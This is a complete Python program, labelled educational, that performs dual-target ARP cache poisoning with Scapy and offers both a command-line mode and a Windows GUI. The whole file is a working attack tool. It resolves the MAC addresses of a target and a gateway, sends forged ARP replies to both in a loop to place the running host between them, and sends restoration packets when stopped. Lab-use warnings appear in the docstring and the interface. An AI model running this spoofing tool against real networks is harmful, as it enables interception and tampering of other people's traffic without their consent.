#!/usr/bin/env python3
"""
Educational ARP cache poisoning demonstration using Scapy.

This script provides both CLI and a Windows-friendly Tkinter GUI for a
controlled lab demonstration of dual-target ARP spoofing and restoration.

Use only in environments you own or are explicitly authorized to test.
Run on Windows from an elevated Administrator shell.
"""

import argparse
import ipaddress
import queue
import sys
import threading
import time
import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk
from typing import Callable, Optional

from scapy.all import ARP, Ether, conf, get_if_addr, get_if_hwaddr, get_working_if, send, srp  # type: ignore


DEFAULT_INTERVAL = 2.0
RESTORE_BURST = 5
WINDOW_TITLE = "Scapy ARP Demo"


class DemoConfig:
    def __init__(
        self,
        ip_1: str,
        ip_2: str,
        mac_1: Optional[str],
        mac_2: Optional[str],
        interval: float,
    ) -> None:
        self.ip_1 = ip_1
        self.ip_2 = ip_2
        self.mac_1 = mac_1
        self.mac_2 = mac_2
        self.interval = interval


class SpoofSession:
    def __init__(self, logger: Callable[[str], None]) -> None:
        self.logger = logger
        self.stop_event = threading.Event()
        self.worker: Optional[threading.Thread] = None
        self.running = False
        self.target_mac: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.config: Optional[DemoConfig] = None
        self.packets_sent = 0

    def start(self, config: DemoConfig) -> None:
        if self.running:
            raise RuntimeError("Session is already running.")

        validate_config(config)
        self.config = config
        self.stop_event.clear()
        self.packets_sent = 0
        self.worker = threading.Thread(target=self._run, daemon=True)
        self.running = True
        self.worker.start()

    def stop(self) -> None:
        if not self.running:
            return

        self.stop_event.set()
        if self.worker and self.worker.is_alive():
            self.worker.join(timeout=5)
        self.running = False

    def _run(self) -> None:
        assert self.config is not None
        conf.verb = 0

        try:
            self.logger("[+] Resolving MAC addresses...")
            self.target_mac = resolve_mac(self.config.ip_1, self.config.mac_1, "target", self.logger)
            self.gateway_mac = resolve_mac(self.config.ip_2, self.config.mac_2, "gateway", self.logger)
            self.logger("[+] Spoofing started. Use Stop to restore ARP state.")

            while not self.stop_event.is_set():
                spoof(target_ip=self.config.ip_1, target_mac=self.target_mac, spoof_ip=self.config.ip_2)
                spoof(target_ip=self.config.ip_2, target_mac=self.gateway_mac, spoof_ip=self.config.ip_1)
                self.packets_sent += 2
                self.logger(f"[*] Sent spoofed ARP replies: {self.packets_sent}")
                if self.stop_event.wait(self.config.interval):
                    break
        except PermissionError:
            self.logger("[!] Permission denied. Run from an elevated Administrator shell.")
        except Exception as exc:
            self.logger(f"[!] Runtime error: {exc}")
        finally:
            try:
                self._restore_if_possible()
            finally:
                self.running = False
                self.logger("[+] Session stopped.")

    def _restore_if_possible(self) -> None:
        if not self.config or not self.target_mac or not self.gateway_mac:
            return

        self.logger("[!] Restoring ARP tables...")
        restore(
            destination_ip=self.config.ip_1,
            destination_mac=self.target_mac,
            source_ip=self.config.ip_2,
            source_mac=self.gateway_mac,
        )
        restore(
            destination_ip=self.config.ip_2,
            destination_mac=self.gateway_mac,
            source_ip=self.config.ip_1,
            source_mac=self.target_mac,
        )
        self.logger("[+] Restoration packets sent.")


def validate_ip(value: str, field_name: str) -> str:
    try:
        return str(ipaddress.ip_address(value.strip()))
    except ValueError as exc:
        raise ValueError(f"Invalid {field_name}: {value}") from exc


def validate_config(config: DemoConfig) -> None:
    config.ip_1 = validate_ip(config.ip_1, "IP_1")
    config.ip_2 = validate_ip(config.ip_2, "IP_2")

    if config.ip_1 == config.ip_2:
        raise ValueError("IP_1 and IP_2 must be different.")
    if config.interval <= 0:
        raise ValueError("Interval must be greater than zero.")


def get_mac(ip_address: str, timeout: int = 2, retry: int = 2) -> Optional[str]:
    """Resolve a MAC address for an IPv4 host using an ARP broadcast."""
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
    answered, _ = srp(packet, timeout=timeout, retry=retry, verbose=False)

    for _, response in answered:
        return response.hwsrc

    return None


def resolve_mac(
    ip_address: str,
    provided_mac: Optional[str],
    label: str,
    logger: Optional[Callable[[str], None]] = None,
) -> str:
    """Use a supplied MAC address or auto-discover it."""
    if provided_mac:
        if logger:
            logger(f"[+] Using manual {label} MAC for {ip_address}: {provided_mac}")
        return provided_mac

    discovered_mac = get_mac(ip_address)
    if discovered_mac:
        if logger:
            logger(f"[+] Resolved {label} ({ip_address}) MAC: {discovered_mac}")
        return discovered_mac

    raise ValueError(f"Could not resolve MAC for {label} ({ip_address}). Enter it manually.")


def spoof(target_ip: str, target_mac: str, spoof_ip: str) -> None:
    """Send one forged ARP reply mapping spoof_ip to this host's MAC."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(destination_ip: str, destination_mac: str, source_ip: str, source_mac: str) -> None:
    """Restore a correct ARP mapping by sending multiple legitimate replies."""
    packet = ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    send(packet, count=RESTORE_BURST, verbose=False)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Educational dual-target ARP spoofing demonstration using Scapy.",
    )
    parser.add_argument("ip_1", nargs="?", help="Target device IPv4 address")
    parser.add_argument("ip_2", nargs="?", help="Gateway/router IPv4 address")
    parser.add_argument("--mac-1", help="Known MAC address for ip_1")
    parser.add_argument("--mac-2", help="Known MAC address for ip_2")
    parser.add_argument(
        "--interval",
        type=float,
        default=DEFAULT_INTERVAL,
        help=f"Seconds between ARP packets (default: {DEFAULT_INTERVAL})",
    )
    parser.add_argument(
        "--cli",
        action="store_true",
        help="Run in command-line mode instead of GUI mode",
    )
    return parser.parse_args()


def run_cli(args: argparse.Namespace) -> int:
    if not args.ip_1 or not args.ip_2:
        print("[!] CLI mode requires ip_1 and ip_2.")
        return 1

    try:
        config = DemoConfig(args.ip_1, args.ip_2, args.mac_1, args.mac_2, args.interval)
        validate_config(config)
    except Exception as exc:
        print(f"[!] Argument error: {exc}")
        return 1

    conf.verb = 0

    try:
        target_mac = resolve_mac(config.ip_1, config.mac_1, "target", print)
        gateway_mac = resolve_mac(config.ip_2, config.mac_2, "gateway", print)
    except Exception as exc:
        print(f"[!] MAC resolution failed: {exc}")
        return 1

    print("[+] Starting ARP spoofing loop. Press Ctrl+C to stop and restore network state.")
    packets_sent = 0

    try:
        while True:
            spoof(target_ip=config.ip_1, target_mac=target_mac, spoof_ip=config.ip_2)
            spoof(target_ip=config.ip_2, target_mac=gateway_mac, spoof_ip=config.ip_1)
            packets_sent += 2
            print(f"[*] Sent {packets_sent} spoofed ARP replies", end="\r", flush=True)
            time.sleep(config.interval)
    except KeyboardInterrupt:
        print("\n[!] Interrupt received. Restoring ARP tables...")
        restore(config.ip_1, target_mac, config.ip_2, gateway_mac)
        restore(config.ip_2, gateway_mac, config.ip_1, target_mac)
        print("[+] Restoration packets sent. Exiting.")
        return 0
    except PermissionError:
        print("[!] Permission denied. Run the script from an elevated Administrator shell.")
        return 1


class App:
    def __init__(self, root: tk.Tk) -> None:
        self.root = root
        self.root.title(WINDOW_TITLE)
        self.root.geometry("900x650")
        self.root.minsize(820, 560)

        self.log_queue: "queue.Queue[str]" = queue.Queue()
        self.session = SpoofSession(self.enqueue_log)

        self.ip_1_var = tk.StringVar()
        self.ip_2_var = tk.StringVar()
        self.mac_1_var = tk.StringVar()
        self.mac_2_var = tk.StringVar()
        self.interval_var = tk.StringVar(value=str(DEFAULT_INTERVAL))
        self.status_var = tk.StringVar(value="Idle")
        self.iface_var = tk.StringVar(value=self.build_interface_info())

        self.build_ui()
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.after(150, self.process_log_queue)

    def build_interface_info(self) -> str:
        try:
            iface = get_working_if()
            iface_name = getattr(iface, "name", str(iface))
            iface_ip = get_if_addr(iface)
            iface_mac = get_if_hwaddr(iface)
            return f"Interface: {iface_name} | Local IP: {iface_ip} | Local MAC: {iface_mac}"
        except Exception:
            return "Interface: unavailable"

    def build_ui(self) -> None:
        main = ttk.Frame(self.root, padding=12)
        main.pack(fill="both", expand=True)

        title = ttk.Label(main, text="Educational ARP Demo Control Panel", font=("Segoe UI", 14, "bold"))
        title.pack(anchor="w", pady=(0, 10))

        info = ttk.Label(
            main,
            text="Use only in an isolated lab you own or are authorized to test.",
            foreground="#9a6700",
        )
        info.pack(anchor="w", pady=(0, 10))

        top_frame = ttk.LabelFrame(main, text="Configuration", padding=12)
        top_frame.pack(fill="x")

        labels = [
            ("IP_1 (target)", self.ip_1_var),
            ("MAC_1 (optional)", self.mac_1_var),
            ("IP_2 (gateway)", self.ip_2_var),
            ("MAC_2 (optional)", self.mac_2_var),
            ("Interval (sec)", self.interval_var),
        ]

        for row_index, (label_text, variable) in enumerate(labels):
            ttk.Label(top_frame, text=label_text).grid(row=row_index, column=0, sticky="w", padx=(0, 10), pady=6)
            ttk.Entry(top_frame, textvariable=variable, width=36).grid(row=row_index, column=1, sticky="ew", pady=6)

        top_frame.columnconfigure(1, weight=1)

        tools = ttk.Frame(main, padding=(0, 12, 0, 12))
        tools.pack(fill="x")

        ttk.Button(tools, text="Auto Resolve MACs", command=self.auto_resolve).pack(side="left", padx=(0, 8))
        ttk.Button(tools, text="Swap IPs", command=self.swap_ips).pack(side="left", padx=(0, 8))
        ttk.Button(tools, text="Fill Demo Values", command=self.fill_demo_values).pack(side="left", padx=(0, 8))
        ttk.Button(tools, text="Clear Log", command=self.clear_log).pack(side="left")

        controls = ttk.LabelFrame(main, text="Control", padding=12)
        controls.pack(fill="x")

        self.start_button = ttk.Button(controls, text="Start", command=self.start_session)
        self.start_button.pack(side="left", padx=(0, 8))

        self.stop_button = ttk.Button(controls, text="Stop + Restore", command=self.stop_session)
        self.stop_button.pack(side="left", padx=(0, 8))
        self.stop_button.state(["disabled"])

        ttk.Label(controls, textvariable=self.status_var).pack(side="left", padx=(16, 8))

        local_info = ttk.Label(main, textvariable=self.iface_var)
        local_info.pack(anchor="w", pady=(12, 8))

        notes = ttk.Label(
            main,
            text="Tips: run as Administrator, confirm WinPcap/Npcap is installed, and use only in a test VLAN/lab.",
            foreground="#555555",
        )
        notes.pack(anchor="w", pady=(0, 8))

        log_frame = ttk.LabelFrame(main, text="Log", padding=12)
        log_frame.pack(fill="both", expand=True)

        self.log_widget = scrolledtext.ScrolledText(log_frame, wrap="word", height=20, font=("Consolas", 10))
        self.log_widget.pack(fill="both", expand=True)
        self.log_widget.configure(state="disabled")

    def enqueue_log(self, message: str) -> None:
        self.log_queue.put(message)

    def process_log_queue(self) -> None:
        while not self.log_queue.empty():
            message = self.log_queue.get_nowait()
            self.log_widget.configure(state="normal")
            self.log_widget.insert("end", message + "\n")
            self.log_widget.see("end")
            self.log_widget.configure(state="disabled")

            if "Spoofing started" in message:
                self.status_var.set("Running")
                self.start_button.state(["disabled"])
                self.stop_button.state(["!disabled"])
            elif "Session stopped" in message:
                self.status_var.set("Stopped")
                self.start_button.state(["!disabled"])
                self.stop_button.state(["disabled"])

        self.root.after(150, self.process_log_queue)

    def build_config(self) -> DemoConfig:
        try:
            interval = float(self.interval_var.get().strip())
        except ValueError as exc:
            raise ValueError("Interval must be a number.") from exc

        return DemoConfig(
            ip_1=self.ip_1_var.get().strip(),
            ip_2=self.ip_2_var.get().strip(),
            mac_1=self.mac_1_var.get().strip() or None,
            mac_2=self.mac_2_var.get().strip() or None,
            interval=interval,
        )

    def start_session(self) -> None:
        try:
            config = self.build_config()
            validate_config(config)
            self.session.start(config)
            self.status_var.set("Starting...")
            self.start_button.state(["disabled"])
            self.stop_button.state(["!disabled"])
        except Exception as exc:
            messagebox.showerror("Configuration error", str(exc))

    def stop_session(self) -> None:
        self.status_var.set("Stopping...")
        self.session.stop()

    def auto_resolve(self) -> None:
        try:
            ip_1 = validate_ip(self.ip_1_var.get().strip(), "IP_1")
            ip_2 = validate_ip(self.ip_2_var.get().strip(), "IP_2")
        except Exception as exc:
            messagebox.showerror("IP error", str(exc))
            return

        self.enqueue_log("[+] Auto-resolving MAC addresses...")

        def worker() -> None:
            try:
                mac_1 = get_mac(ip_1)
                mac_2 = get_mac(ip_2)
                if mac_1:
                    self.root.after(0, lambda: self.mac_1_var.set(mac_1))
                    self.enqueue_log(f"[+] IP_1 MAC: {mac_1}")
                else:
                    self.enqueue_log("[!] Could not resolve MAC for IP_1")

                if mac_2:
                    self.root.after(0, lambda: self.mac_2_var.set(mac_2))
                    self.enqueue_log(f"[+] IP_2 MAC: {mac_2}")
                else:
                    self.enqueue_log("[!] Could not resolve MAC for IP_2")
            except Exception as exc:
                self.enqueue_log(f"[!] Auto-resolve failed: {exc}")

        threading.Thread(target=worker, daemon=True).start()

    def swap_ips(self) -> None:
        ip_1, ip_2 = self.ip_1_var.get(), self.ip_2_var.get()
        mac_1, mac_2 = self.mac_1_var.get(), self.mac_2_var.get()
        self.ip_1_var.set(ip_2)
        self.ip_2_var.set(ip_1)
        self.mac_1_var.set(mac_2)
        self.mac_2_var.set(mac_1)
        self.enqueue_log("[+] Swapped IP/MAC fields.")

    def fill_demo_values(self) -> None:
        self.ip_1_var.set("192.168.1.10")
        self.ip_2_var.set("192.168.1.1")
        self.interval_var.set(str(DEFAULT_INTERVAL))
        self.enqueue_log("[+] Filled demo values. Update them before use.")

    def clear_log(self) -> None:
        self.log_widget.configure(state="normal")
        self.log_widget.delete("1.0", "end")
        self.log_widget.configure(state="disabled")

    def on_close(self) -> None:
        if self.session.running:
            if not messagebox.askyesno("Exit", "Stop the session, restore ARP tables, and exit?"):
                return
            self.session.stop()
        self.root.destroy()


def run_gui() -> int:
    root = tk.Tk()
    style = ttk.Style()
    try:
        style.theme_use("vista")
    except Exception:
        pass
    App(root)
    root.mainloop()
    return 0


def main() -> int:
    args = parse_args()
    if args.cli:
        return run_cli(args)

    if args.ip_1:
        pass
    return run_gui()


if __name__ == "__main__":
    sys.exit(main())
